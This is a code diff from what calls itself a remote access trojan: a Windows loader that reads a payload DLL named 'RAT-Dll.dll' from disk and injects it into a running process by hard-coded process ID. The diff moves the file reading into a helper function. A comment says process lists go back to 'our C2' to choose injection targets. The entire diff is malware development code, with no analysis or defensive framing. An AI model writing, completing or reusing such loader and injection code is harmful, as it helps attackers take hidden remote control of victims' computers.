@@ -12,8 +12,8 @@ INT main()
     HANDLE hFile;
     DWORD dwBytesRead = 0;
     CHAR msgBuf[MAX_BUFFER_SIZE], *fileContents = NULL, *fileBytes = NULL;
-    LARGE_INTEGER fileSize;
-    LPCSTR filePath = "C:\\RAT-Dll.dll";
+    UINT64 fileSize = 0;
+    char filePath [] = "C:\\RAT-Dll.dll";
     DWORD lastError, bufferSize;
     LPCWSTR dllName = DLL_NAME;
     HMODULE hGetProcIDLL = LoadLibrary(dllName);
@@ -26,63 +26,20 @@ INT main()
     // First, parse processes on the system we can see to inject our DLL into; send these back to our C2 to see which to inject into
 
     // Read in payload; get size
-    
-    hFile = CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE)
+   
+    status = readPayload(filePath, &fileSize, &fileBytes);
+    if (status != ERROR_SUCCESS)
     {
-        OutputDebugStringA("RAT-Exe-Main::main - Failure from CreateFileA (INVALID_HANDLE_VALUE)");
-        status = FAILURE;
-        goto cleanup;
-    }
-
-    // Get file details first prior to reading it so we can get the whole size of the file 
-    if (!GetFileSizeEx(hFile, &fileSize))
-    {
-        sprintf_s(msgBuf, "RAT-Exe-Main::main - Failure from GetFileSizeEx %d\n", GetLastError());
+        printf_s(msgBuf, "RAT-Exe::main - Failure from readPayload %d\n", status);
         OutputDebugStringA(msgBuf);
-        status = GetLastError();
         goto cleanup;
     }
 
-    // Allocate for our file buffer
-    fileContents = (char*)malloc(fileSize.QuadPart * sizeof(char));
-    if (fileContents == NULL)
-    {
-        OutputDebugStringA("RAT-Exe-Main::main - Failure from malloc (NOT ENOUGH MEMORY)");
-        status = FAILURE;
-        goto cleanup;
-    }
 
-    // These data sizes dont technically match up so fix this later...
-    bufferSize = fileSize.QuadPart;
-
-    sprintf_s(msgBuf, "RAT-Exe-Main::main - Size of buffer we're grabbing: %d\n", bufferSize);
-    OutputDebugStringA(msgBuf);
-
-    // Now note the size and read the file 
-    if (!ReadFile(hFile, fileContents, fileSize.QuadPart, &dwBytesRead, NULL))
-    {
-        sprintf_s(msgBuf, "RAT-Exe-Main::main - Failure from ReadFile %d\n", GetLastError());
-        OutputDebugStringA(msgBuf);
-        status = GetLastError();
-        goto cleanup;
-    }
-
-    fileBytes = fileContents;
-
-    // Normal Windows app will close the handle to the file
-    if (!CloseHandle(hFile))
-    {
-        printf_s(msgBuf, "RAT-Dll-GetFile::performGetFile - Failure from CloseHandle %d\n", GetLastError());
-        OutputDebugStringA(msgBuf);
-        status = GetLastError();
-        goto cleanup;
-    }
-     
     
     // lets just test inject first to get that working 
         // paint inject test 
-    status = inject(4480, bufferSize, fileBytes);
+    status = inject(7408, fileSize, fileBytes);
     if (status != ERROR_SUCCESS)
     {
         printf_s(msgBuf, "RAT-Exe::main - Failure from inject %d\n", status);
